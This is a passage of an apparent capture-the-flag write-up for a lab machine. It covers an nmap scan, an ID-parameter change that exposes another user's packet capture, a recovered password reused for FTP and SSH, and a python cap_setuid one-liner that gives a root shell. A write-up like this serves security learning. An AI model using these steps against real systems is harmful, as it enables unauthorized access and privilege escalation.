+SF:nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20193
+SF:86\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20class=\&quot;no-js\&quot;\x20lang=\&quot;en\&quot;&gt;\
+SF:n\n&lt;head&gt;\n\x20\x20\x20\x20&lt;meta\x20charset=\&quot;utf-8\&quot;&gt;\n\x20\x20\x20\x2
+SF:0&lt;meta\x20http-equiv=\&quot;x-ua-compatible\&quot;\x20content=\&quot;ie=edge\&quot;&gt;\n\x20\
+SF:x20\x20\x20&lt;title&gt;Security\x20Dashboard&lt;/title&gt;\n\x20\x20\x20\x20&lt;meta\
+SF:x20name=\&quot;viewport\&quot;\x20content=\&quot;width=device-width,\x20initial-scale=
+SF:1\&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&quot;shortcut\x20icon\&quot;\x20type=\&quot;image
+SF:/png\&quot;\x20href=\&quot;/static/images/icon/favicon\.ico\&quot;&gt;\n\x20\x20\x20\x20&lt;
+SF:link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;/static/css/bootstrap\.min\.css\&quot;&gt;
+SF:\n\x20\x20\x20\x20&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;/static/css/fon
+SF:t-awesome\.min\.css\&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&quot;stylesheet\&quot;\x20
+SF:href=\&quot;/static/css/themify-icons\.css\&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=
+SF:\&quot;stylesheet\&quot;\x20href=\&quot;/static/css/metisMenu\.css\&quot;&gt;\n\x20\x20\x20\x2
+SF:0&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;/static/css/owl\.carousel\.min\.
+SF:css\&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;/static/c
+SF:ss/slicknav\.min\.css\&quot;&gt;\n\x20\x20\x20\x20&lt;!--\x20amchar&quot;)%r(HTTPOption
+SF:s,B3,&quot;HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20Mon,\x2
+SF:016\x20Aug\x202021\x2002:33:01\x20GMT\r\nConnection:\x20close\r\nConten
+SF:t-Type:\x20text/html;\x20charset=utf-8\r\nAllow:\x20OPTIONS,\x20HEAD,\x
+SF:20GET\r\nContent-Length:\x200\r\n\r\n&quot;)%r(RTSPRequest,121,&quot;HTTP/1\.1\x2
+SF:0400\x20Bad\x20Request\r\nConnection:\x20close\r\nContent-Type:\x20text
+SF:/html\r\nContent-Length:\x20196\r\n\r\n&lt;html&gt;\n\x20\x20&lt;head&gt;\n\x20\x20
+SF:\x20\x20&lt;title&gt;Bad\x20Request&lt;/title&gt;\n\x20\x20&lt;/head&gt;\n\x20\x20&lt;body&gt;\
+SF:n\x20\x20\x20\x20&lt;h1&gt;&lt;p&gt;Bad\x20Request&lt;/p&gt;&lt;/h1&gt;\n\x20\x20\x20\x20Invali
+SF:d\x20HTTP\x20Version\x20&#x27;Invalid\x20HTTP\x20Version:\x20&#x27;RTSP
+SF:/1\.0&#x27;&#x27;\n\x20\x20&lt;/body&gt;\n&lt;/html&gt;\n&quot;)%r(FourOhFourRequest,189
+SF:,&quot;HTTP/1\.0\x20404\x20NOT\x20FOUND\r\nServer:\x20gunicorn\r\nDate:\x20M
+SF:on,\x2016\x20Aug\x202021\x2002:33:07\x20GMT\r\nConnection:\x20close\r\n
+SF:Content-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20232\
+SF:r\n\r\n&lt;!DOCTYPE\x20HTML\x20PUBLIC\x20\&quot;-//W3C//DTD\x20HTML\x203\.2\x20
+SF:Final//EN\&quot;&gt;\n&lt;title&gt;404\x20Not\x20Found&lt;/title&gt;\n&lt;h1&gt;Not\x20Found&lt;/h1&gt;
+SF:\n&lt;p&gt;The\x20requested\x20URL\x20was\x20not\x20found\x20on\x20the\x20ser
+SF:ver\.\x20If\x20you\x20entered\x20the\x20URL\x20manually\x20please\x20ch
+SF:eck\x20your\x20spelling\x20and\x20try\x20again\.&lt;/p&gt;\n&quot;);
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</code></pre><p id="82e8b9ea-5b74-4a6c-b134-a91e540ceb93" class="">Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .</p><h1 id="8003aac1-5190-409b-98a0-d79d7b206c7b" class="">Nmap done at Sun Aug 15 22:21:39 2021 -- 1 IP address (1 host up) scanned in 186.02 seconds</h1><h2 id="b438b2c0-5a10-40bc-b3c6-b1607011e7b0" class="">2. Enumeration</h2><p id="7c8d77e5-aa1f-480e-8487-6081420fa0b0" class="">It is a nice dashboard that displays the result of monitoring of the network. On the left sidebar menu, we can see PCAP analysis. PCAP means “packet capture”. This means it contains the data of packets that are sent over network. Furthermore, we can store these files and analysis them later using tools like wireshark. Thus, I clicked the second options.</p><figure id="a520e29e-867d-4b60-aeb6-54bed49dc093" class="image"><a href="https://nepcodex.com/wp-content/uploads/2021/06/image-534-700x338.png"><img src="https://nepcodex.com/wp-content/uploads/2021/06/image-534-700x338.png"/></a></figure><p id="3c21f3a5-6acd-424b-b061-5be84994b0e3" class="">However, the application didn’t show any packets. So, I changed the path parameter from 28 to 0.</p><figure id="f7414c7d-52f5-4ff1-ae02-e2ee6e3c49b6" class="image"><a href="https://nepcodex.com/wp-content/uploads/2021/06/image-535-700x332.png"><img src="https://nepcodex.com/wp-content/uploads/2021/06/image-535-700x332.png"/></a></figure><p id="189842fa-64b0-47f5-9ceb-5633c6283eeb" class="">Fortunately, it worked. If it hadn’t worked, I would have started doing fuzzing rather than testing one by one. Next, I downloaded the pcap file and opened in wireshark.</p><p id="eb153115-3fb5-409c-aab2-b557d8e58d5c" class="">
+</p><pre id="49a2a50d-3599-43a0-9a89-1bcbf9173c63" class="code code-wrap"><code>wireshark 0.pcap</code></pre><p id="4a28a23a-774a-45ea-b73d-8da65fb8fbcc" class="">
+</p><p id="2196b539-eb7e-4dfc-8671-0400845ee7ed" class="">By analyzing the packet I found a password for user &#x27;Nathan&#x27;</p><p id="0c8d4bd8-9a8a-4d99-a38a-cb006e82c62c" class="">
+</p><figure id="a0f822b9-e373-46f7-be9a-3788e7eda88d" class="image"><a href="Cap%20bb62c/Untitled%201.png"><img style="width:1350px" src="Cap%20bb62c/Untitled%201.png"/></a></figure><p id="b38ff532-3799-47b7-88ab-fe95a740b6ef" class="">
+</p><p id="a81cc705-73ba-4423-937c-65d820d6e6cb" class="">So tired to login into FTP using pass that i found </p><p id="760bc532-d2fb-42e5-a26a-4c9225430a24" class="">
+</p><h2 id="9c7166c9-92ea-4239-b4ec-e6d0a6bd7bd1" class="">3.Getting Access</h2><figure id="8abb1e57-dc8a-4d4f-9343-bebbf11d1088" class="image"><a href="Cap%20bb62c/Untitled%202.png"><img style="width:683px" src="Cap%20bb62c/Untitled%202.png"/></a></figure><p id="26c3003f-3467-4bef-a752-1987b8d90a01" class="">logged in as nathan</p><p id="4ea24ac3-0be8-4257-9181-7b5261050f9c" class="">
+</p><p id="663db413-3d01-4ada-bfd2-bbd7c5727612" class="">But  lets try with same creds can we access ssh </p><p id="d0c626a4-8575-4ef9-9ee0-c194109ca6db" class="">
+</p><figure id="327de4c6-5282-451a-bf0e-5329070a07be" class="image"><a href="Cap%20bb62c/Untitled%203.png"><img style="width:692px" src="Cap%20bb62c/Untitled%203.png"/></a></figure><p id="27ade69a-86e0-4648-b44e-e73462bd84b2" class="">Same creds works for SSH also </p><p id="073da662-d0ba-4bab-a223-a59af01e5732" class="">
+</p><p id="e37ee41a-88b8-4513-9d9d-9d63a99e1831" class="">found some files in directory and our user flag</p><p id="bb651c19-7430-4977-afb7-602d318c29c4" class="">
+</p><figure id="22b40373-f949-4dd0-b1f4-121b1d15abdd" class="image"><a href="Cap%20bb62c/Untitled%204.png"><img style="width:159px" src="Cap%20bb62c/Untitled%204.png"/></a></figure><h2 id="7cdfcb19-18c6-4a51-a2d5-83baccb215bf" class="">4.Privileage Escalation</h2><p id="e033e998-af7e-479a-a8e6-92af329edf1b" class="">now lets try to gain root access</p><p id="0e594c54-edb6-4b76-a2c6-e92d74bcca62" class="">Next, I searched for the sudo permissions, SUID binaries and capabilities that could escalate the privileges by giving us the root shell. Fortunately, I have cap_setuid available or the python3.8 binary on the target.</p><p id="201854b4-f2ce-424b-b132-6308f0ce610e" class="">
+</p><pre id="1d7f8962-7740-475b-9433-117b15ed3012" class="code code-wrap"><code>getcap -r / 2&gt;/dev/null</code></pre><figure id="712f8905-e6f8-48dd-8946-6f5cb6d6870b" class="image"><a href="Cap%20bb62c/Untitled%205.png"><img style="width:692px" src="Cap%20bb62c/Untitled%205.png"/></a></figure><p id="fa0d116b-30d0-425f-a691-1e13d097af2b" class="">Then, a quick search on gtfobins led me to the root shell.</p><p id="a2def0d2-a858-4a20-bfab-1dcba07916ff" class=""><a href="https://gtfobins.github.io/gtfobins/python/#capabilities">https://gtfobins.github.io/gtfobins/python/#capabilities</a></p><p id="be020edb-f29e-446a-b5ee-65c29cc5fe7b" class="">
+</p><pre id="603ca719-5f13-417b-9423-132a8ded8a02" class="code code-wrap"><code>python3.8 -c &#x27;import os; os.setuid(0); os.system(&quot;/bin/bash&quot;)&#x27;</code></pre><figure id="d799a1af-cc71-4779-9e99-a68258feb2d9" class="image"><a href="Cap%20bb62c/Untitled%206.png"><img style="width:693px" src="Cap%20bb62c/Untitled%206.png"/></a></figure><p id="bde11009-2195-41a7-b9c1-254d3dd5e03c" class="">And root flag was in root in directory</p><p id="fb894bd5-07b9-4c8c-93bf-37279e2c3979" class="">
+</p><p id="fb563d0e-b020-4aaf-8f18-55f55bd79f45" class=""><em><a href="index.html"><strong>&lt;&lt; Back To Home </strong></a></em></p><p id="d75c0b14-b011-411c-8001-cd0fa04a7027" class="">
+</p><p id="63d211ea-251a-4ab9-be34-ad42f3305245" class="">
+</p></div></article></body></html>
